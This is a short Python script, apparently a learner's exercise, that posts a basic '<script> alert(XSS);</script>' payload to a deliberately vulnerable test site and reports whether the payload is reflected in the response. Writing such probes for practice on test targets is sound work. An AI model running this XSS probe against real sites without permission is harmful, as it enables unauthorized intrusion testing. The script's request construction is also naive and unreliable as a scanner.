# -*- coding: utf-8 -*-
"""
Created on Sat Jan  7 13:55:28 2023

@author: adila
"""

import requests
target ="http://testphp.vulnweb.com/"
payload  = "<script> alert(XSS);</script>"

req = requests.post(target + payload)
if payload in req.text:
    print("XSS vulneribility discovered!")
    print("Attack payload:"+payload)
else:
    print("Secure")